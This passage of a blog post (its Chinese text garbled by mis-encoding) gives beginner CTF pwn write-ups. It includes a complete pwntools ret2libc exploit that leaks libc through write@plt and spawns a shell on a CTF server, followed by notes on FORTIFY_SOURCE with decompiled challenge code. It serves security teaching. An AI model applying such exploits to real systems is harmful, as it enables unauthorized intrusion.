<p>ä¹Ÿå°±æ˜¯è¯´<code>ebx = ebp -4</code>åœ¨æˆ‘ä»¬æ ˆæº¢å‡ºé‚£å—å…ˆå¡«å……0x88-4ï¼Œæ¥ç€è¦†ç›–ä¸ŠebxçœŸå®åœ°å€ä¸è®©ç¨‹åºå´©æºƒï¼Œå†æ¥ç»­åé¢çš„æµç¨‹å°±å¥½ã€‚å½“ç„¶0x88-4ç­‰äº132ï¼Œä¹Ÿæ˜¯sçš„å®¹é‡å¤§å°ã€‚</p>
<p>åç§»åœ°å€åœ¨IDAé‡Œç”¨å¿«æ·é”®Ctrl+SæŸ¥çœ‹ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/390.png"
	width="1540"
	height="581"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/390_hu_8c13a81eebe70f43.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/390_hu_198dfee7575ad6ef.png 1024w"
	loading="lazy"
	
		alt=".gotåç§»é‡ï¼š0x1FC0"
	
	
		class="gallery-image" 
		data-flex-grow="265"
		data-flex-basis="636px"
	
></p>
<p>æ‰€ä»¥ebxçœŸå®åœ°å€ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">ebx</span> <span class="o">=</span> <span class="n">elf_base</span> <span class="o">+</span> <span class="mh">0x1FC0</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¤§è‡´æ€è·¯å°±æ˜¯æ¥æ”¶mainå‡½æ•°çš„åœ°å€ï¼Œè®¡ç®—å‡ºelfåŸºå€ï¼Œå†æ¨å‡ºebxçœŸå®åœ°å€ä»è€Œèƒ½é€šè¿‡æ ˆæº¢å‡ºè°ƒç”¨write@pltæ¥æ³„éœ²è‡ªèº«çš„writeçš„çœŸå®åœ°å€ï¼Œæ¥ç€å¾—å‡ºlibcç‰ˆæœ¬åŠlibcåŸºå€ï¼Œè¿›è€Œåæ¨å‡ºæ‰€éœ€è¦çš„åé—¨å‡½æ•°çš„çœŸå®åœ°å€ã€‚</p>
<p>exp:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28277</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./pwn&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf_base</span> <span class="o">=</span> <span class="n">main</span> <span class="o">-</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">write_plt</span> <span class="o">=</span> <span class="n">elf_base</span> <span class="o">+</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">write_got</span> <span class="o">=</span> <span class="n">elf_base</span> <span class="o">+</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">ebx</span> <span class="o">=</span> <span class="mh">0x1FC0</span> <span class="o">+</span> <span class="n">elf_base</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x88</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">ebx</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">write</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s2">&#34;write&#34;</span><span class="p">,</span><span class="n">write</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">write</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;write&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s2">&#34;str_bin_sh&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x88</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span>  <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote class="alert alert-error">
    <blockquote>
<p>æ ‡å‡†çš„ libcï¼ˆC æ ‡å‡†åº“ï¼‰ä¸­ï¼Œ<strong>ä¸å­˜åœ¨ <code>main</code> å‡½æ•°çš„åç§»é‡</strong>ã€‚</p>
</blockquote></blockquote>
<p>è¦æ˜¯è¿™é¢˜è§‰å¾—å¾ˆéš¾ï¼Œæˆ‘å»ºè®®å…ˆè·³è¿‡ï¼Œç­‰ç†Ÿæ‚‰äº†æ ˆæº¢å‡ºæ¼æ´åˆ©ç”¨æ‰‹æ³•å†å›æ¥å®Œæˆè¿™é¢˜ã€‚</p>
<h3 id="fortifyç¼“å†²åŒºè¾¹ç•Œæ£€æŸ¥"><strong>FORTIFYç¼“å†²åŒºè¾¹ç•Œæ£€æŸ¥</strong>
</h3><p><code>FORTIFY_SOURCE</code> æ˜¯ GCC æä¾›çš„ä¸€ç§è½»é‡çº§ç¼“å†²åŒºæº¢å‡ºä¿æŠ¤æœºåˆ¶ï¼Œé€šè¿‡å¯¹å±é™©å‡½æ•°ï¼ˆå¦‚ <code>strcpy</code>ã€<code>memcpy</code> ç­‰ï¼‰è¿›è¡Œå¢å¼ºæ£€æŸ¥ï¼Œé™ä½ç¼“å†²åŒºæº¢å‡ºæ¼æ´çš„åˆ©ç”¨é£é™©ã€‚å®ƒæœ‰ 3 ä¸ªçº§åˆ«ï¼š<code>_FORTIFY_SOURCE=0</code>ï¼ˆå…³é—­ï¼‰ã€<code>_FORTIFY_SOURCE=1</code>ï¼ˆåŸºç¡€ä¿æŠ¤ï¼‰ã€<code>_FORTIFY_SOURCE=2</code>ï¼ˆå¼ºåŒ–ä¿æŠ¤ï¼‰ï¼Œå„çº§åˆ«åŒºåˆ«å¦‚ä¸‹ï¼š</p>
<div class="table-wrapper"><table>
  <thead>
      <tr>
          <th>çº§åˆ«</th>
          <th>å¯ç”¨æ¡ä»¶</th>
          <th>æ ¸å¿ƒæ£€æŸ¥é€»è¾‘</th>
          <th>é˜²æŠ¤èŒƒå›´</th>
          <th>æ€§èƒ½å½±å“</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>0</td>
          <td>é»˜è®¤ï¼ˆæ— éœ€å®šä¹‰å®ï¼‰</td>
          <td>æ— ä»»ä½•æ£€æŸ¥ï¼Œä½¿ç”¨åŸå§‹å‡½æ•°</td>
          <td>æ— </td>
          <td>æ— </td>
      </tr>
      <tr>
          <td>1</td>
          <td>-D_FORTIFY_SOURCE=1 -O1</td>
          <td>æ£€æŸ¥ â€œæºé•¿åº¦ &lt; ç›®æ ‡ç¼“å†²åŒºé•¿åº¦â€ï¼ˆä»…é™ç¼–è¯‘æœŸå¯çŸ¥ï¼‰</td>
          <td>éƒ¨åˆ†é™æ€åœºæ™¯</td>
          <td>æå°</td>
      </tr>
      <tr>
          <td>2</td>
          <td>-D_FORTIFY_SOURCE=2 -O2</td>
          <td>æ£€æŸ¥ â€œæ“ä½œé•¿åº¦ â‰¤ ç›®æ ‡ç¼“å†²åŒºå®é™…å¤§å°â€ï¼ˆå«è¿è¡Œæ—¶ï¼‰</td>
          <td>é™æ€ + åŠ¨æ€åœºæ™¯ï¼Œè¦†ç›–æ›´å¤šå‡½æ•°</td>
          <td>è½»å¾®</td>
      </tr>
  </tbody>
</table></div>
<ul>
<li><code>FORTIFY_SOURCE</code> ä»…èƒ½é˜²æŠ¤éƒ¨åˆ†å·²çŸ¥çš„å±é™©å‡½æ•°ï¼Œæ— æ³•æ›¿ä»£ <code>NX</code>ã€<code>Stack Canary</code> ç­‰æ›´å…¨é¢çš„ä¿æŠ¤æœºåˆ¶ã€‚</li>
<li>å¿…é¡»é…åˆä¼˜åŒ–é€‰é¡¹ï¼ˆ<code>-O1</code>/<code>-O2</code>ï¼‰æ‰èƒ½ç”Ÿæ•ˆï¼Œå¦åˆ™ç¼–è¯‘å™¨ä¼šå¿½ç•¥è¯¥å®å®šä¹‰ã€‚</li>
<li>å¯¹äºåŠ¨æ€åˆ†é…çš„å†…å­˜ï¼ˆå¦‚ <code>malloc</code> åˆ†é…çš„ç¼“å†²åŒºï¼‰ï¼Œ<code>FORTIFY_SOURCE</code> æ— æ³•è·å–å…¶å¤§å°ï¼Œå› æ­¤æ— æ³•é˜²æŠ¤ç›¸å…³æ“ä½œï¼ˆå¦‚ <code>memcpy(malloc_buf, src, n)</code>ï¼‰ã€‚</li>
</ul>
<h3 id="pwn_032">PWN_032
</h3><p>é¢˜ç›®ï¼šFORTIFY_SOURCE=0ï¼š</p>
<p>ç¦ç”¨ Fortify åŠŸèƒ½ã€‚ ä¸ä¼šè¿›è¡Œä»»ä½•é¢å¤–çš„å®‰å…¨æ£€æŸ¥ã€‚ å¯èƒ½å¯¼è‡´æ½œåœ¨çš„å®‰å…¨æ¼æ´ã€‚</p>
<p>è¿™é¢˜ä¸»è¦æ˜¯åœ¨å‡½æ•°é€»è¾‘è¿è¡Œï¼ŒçŸ¥é“è¿è¡Œçš„åŸç†å°±å¥½ã€‚</p>
<p>IDAåˆ†æmainï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/89.png"
	width="849"
	height="610"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/89_hu_46351ba23fdd4185.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/89_hu_90e899f007f35973.png 1024w"
	loading="lazy"
	
		alt="main"
	
	
		class="gallery-image" 
		data-flex-grow="139"
		data-flex-basis="334px"
	
></p>
<p>è·Ÿè¿›undefinedå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/90.png"
	width="1305"
	height="355"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/90_hu_973dd70d1193f96a.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/90_hu_8bf66355b5d6254e.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="367"
		data-flex-basis="882px"
	
></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œå…³é”®åœ¨äºæˆåŠŸè¿›å…¥åˆ°undefinedå‡½æ•°æ‰æœ‰æœºä¼šä¸‹ä¸€æ­¥è·å¾—flagï¼š</p>
<p>ä»mainå‡½æ•°å‡ºå‘ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">__gid_t</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// rax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">num</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-44h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">buf2</span><span class="p">[</span><span class="mi">11</span><span class="p">];</span> <span class="c1">// [rsp+Ah] [rbp-3Eh] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">buf1</span><span class="p">[</span><span class="mi">11</span><span class="p">];</span> <span class="c1">// [rsp+15h] [rbp-33h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="nf">getegid</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="nf">setresgid</span><span class="p">(</span><span class="n">v3</span><span class="p">,</span> <span class="n">v3</span><span class="p">,</span> <span class="n">v3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">logo</span><span class="p">();</span>  
</span></span><span class="line"><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">buf1</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v4</span><span class="p">;</span><span class="c1">//æŒ‡é’ˆ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">*</span><span class="p">(</span><span class="n">_WORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf1</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="n">_WORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span><span class="c1">//æŒ‡é’ˆ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">buf1</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="n">v4</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="nf">strcpy</span><span class="p">(</span><span class="n">buf2</span><span class="p">,</span> <span class="s">&#34;CTFshowPWN&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%s %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">buf1</span><span class="p">,</span> <span class="n">buf2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v5</span> <span class="o">=</span> <span class="nf">strtol</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">memcpy</span><span class="p">(</span><span class="n">buf1</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">v5</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">strcpy</span><span class="p">(</span><span class="n">buf2</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%s %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">buf1</span><span class="p">,</span> <span class="n">buf2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">fgets</span><span class="p">(</span><span class="n">buf1</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="n">_bss_start</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="n">buf1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">num</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">4</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nf">Undefined</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¤§è‡´æ˜¯ï¼šèµ·åˆå…ˆæ‰“å°ctfshowçš„logoä¿¡æ¯ï¼ˆå…¶å®ä¸€å¼€å§‹é‚£ä¸ªv3æŠŠæˆ‘ææ‡µäº†ï¼Œå…¶å®å¯¹è§£é¢˜è¿‡ç¨‹æ²¡å•¥å¸®åŠ©çš„ï¼‰ï¼Œåœ¨æœ€é¡¶ç«¯çš„__fastcall mainå·²ç»æŠŠä¸€äº›å‚æ•°ç»™å®šä¹‰äº†æ¯”å¦‚argvæ•°ç»„ï¼Œç¬¬ä¸€ä¸ªå‚æ•°argv[1]è¢«èµ‹ç»™v4ï¼Œv4ä½œä¸­ä»‹æŠŠæ•°å€¼ä¼ é€’ç»™äº†buf1ï¼Œä¹‹åç¨‹åºå°†v4[10]æ•°ç»„å†…å®¹èµ‹å€¼ç»™buf1[10]ï¼Œæ¥ç€é€šè¿‡strcpyå‡½æ•°ï¼ŒæŠŠå­—ç¬¦ä¸²â€œCTFshowPWNâ€å¤åˆ¶/èµ‹å€¼ç»™buf2ï¼Œprintfæ‰“å°buf1ã€buf2çš„å½“å‰çš„å­—ç¬¦ä¸²å†…å®¹ï¼Œæœ€åfgetè¯»å–_bss_startçš„11ä¸ªå­—ç¬¦ç»™buf1ï¼Œæ‰“å°buf1å’Œnumçš„ä¿¡æ¯ï¼Œæœ€åé€šè¿‡ifåˆ¤æ–­argcæ˜¯å¦å¤§äº4(é»˜è®¤æƒ…å†µä¸‹argcæ˜¯ç­‰äº1çš„ï¼Œå› ä¸ºargv[0]å¿…å®šå­˜åœ¨ï¼Œæˆ‘ä»¬è¾“å…¥ä¸€ä¸ªå‚æ•°ï¼Œargcå°±ä¼šç­‰äº2ï¼Œä¾æ¬¡é€’æ¨)ï¼Œå¤§äº4å°±è¿›å…¥undefinedå‡½æ•°å†…</p>
<p>å› ä¸ºæœ¬é¢˜ç›®FORTIFY_SOURCEæ²¡æœ‰å¼€å¯ï¼Œä»£è¡¨æˆ‘ä»¬å¯åŠ¨å‡½æ•°ç›´æ¥è¾“å…¥4ä¸ªå‚æ•°(è¿™æ—¶argc=5 &gt; 4ï¼Œä¸ºä»€ä¹ˆäº”ä¸ªï¼Ÿå› ä¸ºä½ è¾“å…¥çš„4ä¸ª+argc[0] = 5)å°±è¡Œäº†ï¼Œè€Œä¸”è¿™4ä¸ªå‚æ•°æ²¡æœ‰é•¿åº¦é™åˆ¶ï¼Œå¦‚æœå¼€å¯FORTIFY_SOURCEå°±ä¸å¥½è¯´äº†ï¼Œå› ä¸ºå¼€å¯äº†ä¹‹åï¼Œç”±äºç¨‹åºå­˜åœ¨strcpyå’Œmemcpyå‡½æ•°ä¼šæ£€æµ‹é•¿åº¦ï¼Œå¦‚æœé•¿åº¦è¶…è¿‡äº†é™åˆ¶ï¼Œå¯èƒ½ä¼šä½¿ç¨‹åºæŠ›å‡ºå¼‚å¸¸è€Œé€€å‡ºæ‰§è¡Œã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/91.png"
	width="1400"
	height="756"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/91_hu_15b7482435404dc9.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/91_hu_ba35ebc958987903.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="185"
		data-flex-basis="444px"
	
></p>
<h3 id="pwn_033">PWN_033
</h3><p>é¢˜ç›®ï¼šFORTIFY_SOURCE=1ï¼š</p>
<p>å¯ç”¨ Fortify åŠŸèƒ½çš„åŸºæœ¬çº§åˆ«ã€‚ åœ¨ç¼–è¯‘æ—¶è¿›è¡Œä¸€äº›å®‰å…¨æ£€æŸ¥ï¼Œå¦‚ç¼“å†²åŒºè¾¹ç•Œæ£€æŸ¥ã€æ ¼å¼åŒ–å­—ç¬¦ä¸²æ£€æŸ¥ç­‰ã€‚ åœ¨è¿è¡Œæ—¶è¿›è¡ŒæŸäº›æ£€æŸ¥ï¼Œå¦‚æ£€æµ‹å‡½æ•°è¿”å›å€¼å’Œå¤§å°çš„ä¸€è‡´æ€§ã€‚ å¦‚æœæ£€æµ‹åˆ°æ½œåœ¨çš„å®‰å…¨é—®é¢˜ï¼Œä¼šè§¦å‘è¿è¡Œæ—¶é”™è¯¯ï¼Œå¹¶ç»ˆæ­¢ç¨‹åºæ‰§è¡Œã€‚</p>
<hr>
<p>IDAx64åˆ†æï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/92.png"
	width="890"
	height="575"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/92_hu_b8d7b58369f7ed42.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/92_hu_5f64d4fe00dca924.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="154"
		data-flex-basis="371px"
	
></p>
<p>FORTIFY_SOURCEè¢«æ‰“å¼€äº†ï¼Œä»£ç å’ŒPWN_032å‡ ä¹ä¸€æ ·çš„ï¼Œmemcpyå’Œstrcpyè¿™ä¸¤ä¸ªå‡½æ•°è¢«æ›¿æ¢æˆäº†__mencpy_chkå’Œ__strcpy__chkå®‰å…¨å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸¤ä¸ªå‡½æ•°ç›¸æ¯”å‰ä¸¤ä¸ªå‡½æ•°åªæ˜¯åŠ ä¸Šäº†11LLè¿™ä¸ªå‚æ•°åŠ ä»¥é™åˆ¶ï¼Œå› ä¸ºbuf1å’Œbuf2åœ¨å£°æ˜çš„æ—¶å€™çš„é•¿åº¦å°±æ˜¯11ï¼Œæ‰€ä»¥ç¨‹åºä¸ºäº†é˜²æ­¢æº¢å‡ºï¼Œä½¿ç”¨åä¸¤ä¸ªå‡½æ•°åŠ ä¸Šè¿™ä¸¤ä¸ªæ•°ç»„çš„é•¿åº¦åŠ ä»¥é™åˆ¶ä»¥é˜²æº¢å‡ºã€‚</p>
<p>ä½†è¿™ä¸å¦¨ç¢æˆ‘ä»¬æ‹¿flagå•Šï¼Œåªè¦è¿è¡Œ./pwnmeæ—¶è¾“å…¥çš„å­—ç¬¦æ€»é•¿åº¦ä¸è¶…è¿‡11å°±å¥½ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># argv[1] é•¿åº¦â‰¤10ï¼Œargv[3] â‰¤11ï¼Œæ€»å‚æ•°â‰¥5 </span>
</span></span><span class="line"><span class="cl">$./pwnme <span class="s2">&#34;short&#34;</span> <span class="s2">&#34;a&#34;</span> <span class="s2">&#34;5&#34;</span> <span class="s2">&#34;d&#34;</span> <span class="s2">&#34;e&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/93.png"
	width="1340"
	height="735"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/93_hu_9f26a9108882b142.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/93_hu_c04b5083116f2c7c.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="182"
		data-flex-basis="437px"
	
></p>
<h3 id="pwn_034">PWN_034
</h3><p>é¢˜ç›®ï¼šFORTIFY_SOURCE=2ï¼š</p>
<p>å¯ç”¨ Fortify åŠŸèƒ½çš„é«˜çº§çº§åˆ«ã€‚ åŒ…æ‹¬åŸºæœ¬çº§åˆ«çš„å®‰å…¨æ£€æŸ¥ï¼Œå¹¶æ·»åŠ äº†æ›´å¤šçš„æ£€æŸ¥ã€‚ åœ¨ç¼–è¯‘æ—¶è¿›è¡Œæ›´ä¸¥æ ¼çš„æ£€æŸ¥ï¼Œå¦‚æ›´ç²¾ç¡®çš„ç¼“å†²åŒºè¾¹ç•Œæ£€æŸ¥ã€‚ æä¾›æ›´ä¸°å¯Œçš„ç¼–è¯‘å™¨è­¦å‘Šå’Œé”™è¯¯ä¿¡æ¯ã€‚</p>
<hr>
